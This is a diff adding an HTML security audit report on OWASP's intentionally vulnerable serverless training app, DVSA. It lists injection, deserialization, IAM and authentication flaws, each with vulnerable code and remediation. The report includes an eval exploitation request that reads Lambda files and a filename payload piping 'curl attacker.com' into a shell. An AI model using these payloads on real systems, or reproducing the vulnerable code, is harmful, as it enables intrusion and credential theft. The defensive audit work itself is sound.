@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>DVSA Security Audit Report</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      margin: 2em;
+      background: #fcfcfc;
+      color: #222;
+      line-height: 1.7;
+    }
+    h1, h2, h3 {
+      margin-top: 1.5em;
+      margin-bottom: 0.5em;
+      color: #163659;
+      font-weight: 700;
+    }
+    h1 {
+      font-size: 2.2em;
+      border-bottom: 3px solid #ececec;
+      padding-bottom: 0.3em;
+    }
+    h2 {
+      font-size: 1.5em;
+      border-left: 4px solid #ececec;
+      padding-left: 0.5em;
+      background: #f5f7fb;
+    }
+    h3 {
+      font-size: 1.15em;
+      color: #194184;
+    }
+    hr {
+      margin: 2em 0;
+      border: none;
+      border-top: 1px solid #e9e9e9;
+    }
+    pre, code {
+      background: #f7f7fa;
+      color: #444;
+      padding: 0.2em 0.4em;
+      border-radius: 4px;
+      font-family: Menlo, Monaco, "Consolas", "Liberation Mono", "Courier New", monospace;
+    }
+    pre {
+      padding: 0.75em 1em;
+      margin: 1em 0;
+      white-space: pre-wrap;
+      word-break: break-word;
+      overflow-x: auto;
+    }
+    table {
+      border-collapse: collapse;
+      margin-top: 1em;
+      width: 100%;
+      font-size: 0.98em;
+    }
+    th, td {
+      border: 1px solid #d3d3d8;
+      padding: 0.5em 0.8em;
+      text-align: left;
+    }
+    th {
+      background: #f5f7fb;
+      font-weight: 700;
+    }
+    ul, ol {
+      margin-bottom: 1.5em;
+    }
+    em {
+      color: #555;
+    }
+    .section {
+      margin-bottom: 2.5em;
+    }
+  </style>
+</head>
+<body>
+  <h1>DVSA Security Audit Report</h1>
+  <h2>Damn Vulnerable Serverless Application - Security Assessment</h2>
+  <p>
+    <strong>Assessment Date:</strong> 2024<br>
+    <strong>Application:</strong> OWASP DVSA (Damn Vulnerable Serverless Application)<br>
+    <strong>Architecture:</strong> AWS Serverless (Lambda, API Gateway, DynamoDB, S3, Cognito)<br>
+    <strong>Risk Rating:</strong> <span style="color: #bb2222; font-weight: bold;">CRITICAL</span> – Multiple exploitable vulnerabilities present
+  </p>
+  <hr>
+
+  <h2>Executive Summary</h2>
+  <p>
+    DVSA is an intentionally vulnerable serverless application designed for security training. This audit identified
+    <strong>15+ critical or high-severity vulnerabilities</strong> exhibiting common serverless security anti-patterns. Key risks include remote code execution (RCE), command and code injection, insecure deserialization, and overprivileged IAM policies.
+  </p>
+  <ul>
+    <strong>Critical Risk Areas:</strong>
+    <li>Administrative backdoor with arbitrary code execution</li>
+    <li>Command injection via file upload and email processing</li>
+    <li>Insecure deserialization leading to RCE</li>
+    <li>SQL injection in inventory management</li>
+    <li>Privilege escalation vulnerabilities</li>
+    <li>Overly permissive IAM roles</li>
+  </ul>
+  <hr>
+
+  <h2>Critical Vulnerabilities (CVSS 9.0–10.0)</h2>
+  <div class="section">
+    <h3>1. Remote Code Execution (RCE) via eval() in Admin Shell [CVSS: 10.0]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_shell.js</code></p>
+    <p>
+      <b>Description:</b><br>
+      A critical vulnerability allows arbitrary JavaScript code execution through <code>eval()</code> in the <b>admin_shell.js</b> Lambda. Admin users can execute any code on the Lambda runtime.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>if (cmd) {
+    try {
+        eval(cmd);  // CRITICAL: Arbitrary code execution
+        res = "ok";
+    } catch (error) {
+        console.error(error);
+    }
+}</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Complete compromise of Lambda execution environment</li>
+      <li>Access to AWS credentials and other sensitive environment variables</li>
+      <li>Pivot to other AWS resources via STS tokens</li>
+      <li>Data exfiltration from DynamoDB and S3</li>
+    </ul>
+    <b>Exploitation Example:</b>
+    <pre><code>POST /admin-shell
+{
+  "userId": "&lt;admin_id&gt;",
+  "cmd": "require('child_process').execSync('cat /var/task/*').toString()"
+}</code></pre>
+    <b>Remediation:</b>
+    <ul>
+      <li>Remove <code>eval()</code> completely; use only whitelisted operations</li>
+      <li>Implement strict input validation</li>
+      <li>Apply the principle of least privilege to Lambda execution roles</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>2. Command Injection in Feedback Upload Handler [CVSS: 9.8]</h3>
+    <p><b>Location:</b> <code>backend/functions/processing/feedback_uploads.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      Uses <code>os.system()</code> with user-controlled filenames from S3 event notifications, allowing arbitrary command execution.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>filename = parse.unquote_plus(event["Records"][0]["s3"]["object"]["key"])
+os.system("touch /tmp/{} /tmp/{}.txt".format(filename, filename))  # COMMAND INJECTION
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Arbitrary command execution via malicious filenames (e.g., <code>"; curl attacker.com/exfil | sh #</code>)</li>
+      <li>Compromise of Lambda environment and AWS credentials</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Never pass user input to shell commands</li>
+      <li>If shell execution is required, use Python’s <code>subprocess</code> with argument lists</li>
+      <li>Validate and sanitize all filenames</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>3. Insecure Deserialization via jsonpickle [CVSS: 9.8]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_update_orders.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      Uses <code>jsonpickle.decode()</code> on user-controlled input, enabling remote code execution through Python object deserialization.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>unpickled = jsonpickle.decode(json.dumps(response["Item"], cls=DecimalEncoder))</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Remote code execution via crafted serialized payloads</li>
+      <li>Full server compromise</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Replace <code>jsonpickle</code> with Python’s standard <code>json</code> module</li>
+      <li>Enforce cryptographic signatures for integrity if deserialization is essential</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>4. Code Injection in Admin Order Queries [CVSS: 9.1]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_get_orders.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      User input is concatenated into Python code and executed via <code>eval()</code> in the DynamoDB <code>FilterExpression</code>.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>fe = "Attr('paymentTS').between(dateFrom, dateTo)"
+orderId = "" if 'orderId' not in event else " &amp; Attr('orderId').eq(event['orderId'])"
+fe = fe + orderId + userId + status
+response = table.scan(FilterExpression=eval(fe))  # CODE INJECTION
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Data exfiltration from DynamoDB tables</li>
+      <li>Denial of service via expensive queries</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Use <code>boto3</code>’s <code>Attr()</code> methods directly without <code>eval()</code></li>
+      <li>Implement parameterized queries in DynamoDB</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>5. SQL Injection in Receipt Generation [CVSS: 9.1]</h3>
+    <p><b>Location:</b> <code>backend/functions/processing/create_receipt.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      SQLite queries built using string concatenation with user-controlled IDs.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>res = cur.execute("SELECT itemId, name, price FROM inventory WHERE itemId = " + item_id + ";")</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Data exfiltration from inventory database</li>
+      <li>Potential database corruption</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Use parameterized queries: <code>cur.execute("SELECT ... WHERE itemId = ?", (item_id,))</code></li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>6. Command Injection in Email Receipt Handler [CVSS: 9.1]</h3>
+    <p><b>Location:</b> <code>backend/functions/processing/send_receipt_email.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      User-controlled date or metadata flows into <code>os.system()</code> through shell string formatting.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>os.system(f'echo -e "\t----------------------\n\t\tDate: {date}" &gt;&gt; ' + download_path)
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Command execution via malicious date values or order metadata</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Use Python file operations instead of shell commands: <code>open(download_path, 'a').write(...)</code></li>
+      <li>Sanitize all input passed to shell commands</li>
+    </ul>
+  </div>
+
+  <h2>High Severity Vulnerabilities (CVSS 7.0–8.9)</h2>
+  <div class="section">
+    <h3>7. Privilege Escalation via User Attribute Manipulation [CVSS: 8.8]</h3>
+    <p><b>Location:</b> <code>backend/functions/user/user_create.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      Users can make themselves admins by supplying an <code>Admin: true</code> attribute during registration.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>if "Admin" in event["request"]["userAttributes"] and event["request"]["userAttributes"]["Admin"] == True:
+    isAdmin = True</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Unauthorized admin access</li>
+      <li>Ability to access admin functions, including RCE vectors</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Never trust client-supplied attributes for admin decisions</li>
+      <li>Set admin status only through a secure backend process</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>8. IDOR in Order Retrieval [CVSS: 8.6]</h3>
+    <p><b>Location:</b> <code>backend/functions/order/get_order.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      The <code>isAdmin</code> parameter is user-controlled, allowing any user to access any order by passing <code>isAdmin: true</code>.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>is_admin = event.get("isAdmin", False)
+if is_admin:
+    response = table.query(KeyConditionExpression=Key('orderId').eq(orderId))
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Unauthorized access to other users’ orders and information</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Determine admin status from JWT claims or database, not request parameters</li>
+      <li>Always verify ownership before revealing order details</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>9. Overly Permissive IAM Policies – DynamoDB Access on All Tables [CVSS: 8.5]</h3>
+    <p><b>Location:</b> <code>template.yml</code></p>
+    <p>
+      <b>Description:</b><br>
+      Multiple Lambda functions granted DynamoDB CRUD on <code>'*'</code> (all tables) rather than specific resources.
+    </p>
+    <b>Affected Functions:</b>
+    <ul>
+      <li>OrderCompleteFunction</li>
+      <li>CreateReceiptFunction</li>
+      <li>SendReceiptFunction</li>
+    </ul>
+    <b>Vulnerable Configuration:</b>
+    <pre><code>Policies:
+  - DynamoDBCrudPolicy:
+      TableName: '*'
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Access to all DynamoDB tables; cross-table data leakage</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Specify explicit table names and utilize fine-grained permissions</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>10. Overly Permissive IAM Policies – S3 Full Access [CVSS: 8.5]</h3>
+    <p><b>Location:</b> <code>template.yml</code></p>
+    <p>
+      <b>Description:</b><br>
+      FeedbackUploadFunction has <code>AmazonS3FullAccess</code> and <code>AWSLambda_FullAccess</code>, SendReceiptFunction has S3CrudPolicy on all buckets.
+    </p>
+    <b>Vulnerable Configuration:</b>
+    <pre><code>FeedbackUploadFunction:
+  Policies:
+    - AWSLambda_FullAccess
+    - AmazonS3FullAccess
+
+SendReceiptFunction:
+  Policies:
+    - S3CrudPolicy:
+        BucketName: '*'
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Access to all S3 buckets, potential data exfiltration, privilege escalation</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Restrict S3 permissions to specific buckets or ARNs</li>
+      <li>Remove unnecessary broad Lambda permissions</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>11. Weak Authentication – Cognito Password Policy [CVSS: 7.5]</h3>
+    <p><b>Location:</b> <code>template.yml</code></p>
+    <p>
+      <b>Description:</b><br>
+      Cognito User Pool is configured with minimum 6-character passwords and no complexity requirements.
+    </p>
+    <b>Vulnerable Configuration:</b>
+    <pre><code>PasswordPolicy:
+  RequireLowercase: false
+  RequireSymbols: false
+  RequireNumbers: false
+  MinimumLength: 6
+  RequireUppercase: false
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Susceptible to brute force and credential stuffing attacks</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Enforce minimum 12-character passwords with complexity</li>
+      <li>Enable Cognito advanced security features</li>
+    </ul>
+  </div>
+
+  <h2>Medium Severity Vulnerabilities (CVSS 5.0–6.9)</h2>
+  <div class="section">
+    <h3>12. Arbitrary File Read in Admin Shell [CVSS: 6.5]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_shell.js</code></p>
+    <p>
+      <b>Description:</b><br>
+      Authenticated admin users can read arbitrary files on the Lambda's disk.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>const filename = "/tmp/"+ body.file;
+res = fs.readFileSync(filename, 'utf8');</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Disclosure of temp files, environment variables, and runtime artifacts</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Strictly validate and normalize file paths; use allowlists</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>13. Server-Side Request Forgery (SSRF) in Admin Tweet [CVSS: 6.5]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_tweet.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      The Twitter API endpoint is constructed from user input with no validation, allowing internal requests (e.g., to AWS instance metadata).
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>action = event['api']
+url = '{}{}'.format(twitter_api, action)
+req = urllib2.Request(url, data=data, headers=auth_header)
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Potential access to AWS Instance Metadata Service by manipulating URL</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Whitelist/sanitize <code>api</code> parameter; reject user-supplied hosts</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>14. Path Traversal in Admin Receipt Download [CVSS: 6.3]</h3>
+    <p><b>Location:</b> <code>backend/functions/admin/admin_get_receipts.py</code></p>
+    <p>
+      <b>Description:</b><br>
+      Unvalidated year/month/day parameters are used to construct S3 prefixes.
+    </p>
+    <b>Vulnerable Code:</b>
+    <pre><code>prefix = "{}/{}/{}".format(y, m, d)</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Access to files outside intended date ranges</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Validate parameters with regex: <code>^[0-9]{4}$</code> for year and <code>^[0-9]{2}$</code> for month/day</li>
+    </ul>
+  </div>
+
+  <div class="section">
+    <h3>15. CORS Misconfiguration [CVSS: 5.8]</h3>
+    <p><b>Location:</b> <code>template.yml</code></p>
+    <p>
+      <b>Description:</b><br>
+      API Gateway allows all origins (<code>*</code>).
+    </p>
+    <b>Vulnerable Configuration:</b>
+    <pre><code>Cors:
+  AllowMethods: "'*'"
+  AllowHeaders: "'*'"
+  AllowOrigin: "'*'"
+</code></pre>
+    <b>Impact:</b>
+    <ul>
+      <li>Cross-origin attacks from the web; potential for CSRF</li>
+    </ul>
+    <b>Remediation:</b>
+    <ul>
+      <li>Whitelist explicit origins, headers, and methods</li>
+    </ul>
+  </div>
+
+  <h2>Additional Security Issues</h2>
+  <ul>
+    <li>
+      <b>16. Missing Authorization in Admin Inventory Management</b><br>
+      <b>Location:</b> <code>backend/functions/admin/admin_update_inventory.py</code><br>
+      Any authenticated user can add, delete, or update inventory items due to missing authorization checks.
+    </li>
+    <li>
+      <b>17. Information Disclosure in Error Messages</b><br>
+      Various functions return error messages exposing stack traces, database structure, or internal details.
+    </li>
+    <li>
+      <b>18. Insecure Direct Object Reference in User Profile Updates</b><br>
+      <b>Location:</b> <code>backend/functions/user/user_profile.py</code><br>
+      User profile updates are not properly validated; users may modify other profiles.
+    </li>
+    <li>
+      <b>19. Weak Admin Verification in Admin Shell</b><br>
+      The <code>isAdmin</code> check in admin_shell.js relies only on DynamoDB, not JWT tokens, and can be bypassed if the userId is guessable.
+    </li>
+    <li>
+      <b>20. Log Retention Manipulation</b><br>
+      <b>Location:</b> <code>backend/functions/cronjobs/cron_cleaner.py</code><br>
+      The cron cleaner can modify CloudWatch logs retention, allowing attackers to delete or extend audit logs.
+    </li>
+  </ul>
+
+  <hr>
+
+  <h2>Infrastructure &amp; Configuration Risks</h2>
+  <h3>IAM Policy Summary of Excessive Permissions:</h3>
+  <table>
+    <thead>
+      <tr>
+        <th>Function</th>
+        <th>Excessive Permission</th>
+        <th>Risk</th>
+      </tr>
+    </thead>
+    <tbody>
+      <tr>
+        <td>OrderCompleteFunction</td>
+        <td>DynamoDBCrudPolicy on '*'</td>
+        <td>Access to all DynamoDB tables</td>
+      </tr>
+      <tr>
+        <td>CreateReceiptFunction</td>
+        <td>DynamoDBCrudPolicy on '*'</td>
+        <td>Access to all DynamoDB tables</td>
+      </tr>
+      <tr>
+        <td>SendReceiptFunction</td>
+        <td>S3CrudPolicy on '*'</td>
+        <td>Access to all S3 buckets</td>
+      </tr>
+      <tr>
+        <td>SendReceiptFunction</td>
+        <td>DynamoDBCrudPolicy on '*'</td>
+        <td>Access to all DynamoDB tables</td>
+      </tr>
+      <tr>
+        <td>FeedbackUploadFunction</td>
+        <td>AWSLambda_FullAccess</td>
+        <td>Full Lambda management access</td>
+      </tr>
+      <tr>
+        <td>FeedbackUploadFunction</td>
+        <td>AmazonS3FullAccess</td>
+        <td>Full S3 access account-wide</td>
+      </tr>
+      <tr>
+        <td>OrderManagerFunction</td>
+        <td>CloudWatchLogsFullAccess</td>
+        <td>Full CloudWatch Logs access</td>
+      </tr>
+      <tr>
+        <td>OrderManagerFunction</td>
+        <td>AmazonCognitoPowerUser</td>
+        <td>User management privileges</td>
+      </tr>
+    </tbody>
+  </table>
+
+  <h3>Cognito Security Issues:</h3>
+  <ul>
+    <li><b>Weak Passwords:</b> 6-character minimum, no complexity</li>
+    <li><b>No MFA:</b> Multi-factor authentication not enforced</li>
+    <li><b>No Account Lockout:</b> No brute-force protection</li>
+    <li><b>Explicit Auth Flows:</b> <code>ADMIN_NO_SRP_AUTH</code> used instead of SRP</li>
+  </ul>
+
+  <h3>API Gateway Issues:</h3>
+  <ul>
+    <li>CORS allows all origins (<code>*</code>)</li>
+    <li>No rate limiting or throttling visible</li>
+    <li>No web application firewall (WAF)</li>
+  </ul>
+
+  <hr>
+
+  <h2>Recommendations</h2>
+  <h3>Immediate Actions (Critical)</h3>
+  <ol>
+    <li><strong>Remove or disable admin_shell.js</strong> – The <code>eval()</code> backdoor is an extreme risk</li>
+    <li><strong>Replace <code>os.system()</code> calls</strong> with safe Python file operations</li>
+    <li><strong>Remove <code>jsonpickle</code></strong>; use standard json library</li>
+    <li><strong>Fix IAM policies</strong> to use resource ARNs instead of wildcards</li>
+  </ol>
+
+  <h3>Short-term (High Priority)</h3>
+  <ol start="5">
+    <li><strong>Implement input validation</strong> with allowlists for all user data</li>
+    <li><strong>Fix SQL injection</strong> in create_receipt.py using parameterized queries</li>
+    <li><strong>Implement proper authorization</strong> – verify permissions based on JWTs, not request parameters</li>
+    <li><strong>Strengthen Cognito password policy</strong> (12+ chars, mixed case, numbers, symbols)</li>
+    <li><strong>Restrict CORS</strong> to explicit origins only</li>
+  </ol>
+
+  <h3>Long-term (Security Hardening)</h3>
+  <ol start="10">
+    <li>Deploy AWS WAF configured for the OWASP Top 10</li>
+    <li>Enable CloudTrail for comprehensive audit logging</li>
+    <li>Implement VPC endpoints for private service communication</li>
+    <li>Enable DynamoDB encryption at rest and in transit</li>
+    <li>Adopt secrets management via AWS Secrets Manager or Parameter Store</li>
+    <li>Add security headers (HSTS, CSP, X-Frame-Options) to API Gateway responses</li>
+  </ol>
+
+  <hr>
+
+  <h2>Compliance Considerations</h2>
+  <p>This application violates several security standards:</p>
+  <ul>
+    <li><b>OWASP Top 10:</b> A01 (Broken Access Control), A03 (Injection), A07 (Authentication Failures), A09 (Security Logging Failures)</li>
+    <li><b>CIS AWS Foundations:</b> IAM policies violate least privilege recommendations</li>
+    <li><b>PCI DSS:</b> Payment data is stored without proper encryption or access controls</li>
+    <li><b>GDPR:</b> Lacks proper access controls for personal data (PII)</li>
+  </ul>
+  <hr>
+
+  <h2>Conclusion</h2>
+  <p>
+    DVSA contains intentional vulnerabilities for educational purposes only. If ever deployed with production credentials or customer data, it presents <b>critical security risks</b>. The combination of RCE, command injection, and excessive IAM privileges could easily result in a total AWS account compromise.
+  </p>
+  <p><strong style="color: #b40000;">Risk Rating: CRITICAL – DO NOT DEPLOY IN PRODUCTION ENVIRONMENTS</strong></p>
+  <hr>
+  <p><em>Report generated by automated security analysis of the DVSA codebase.</em></p>
+</body>
+</html>
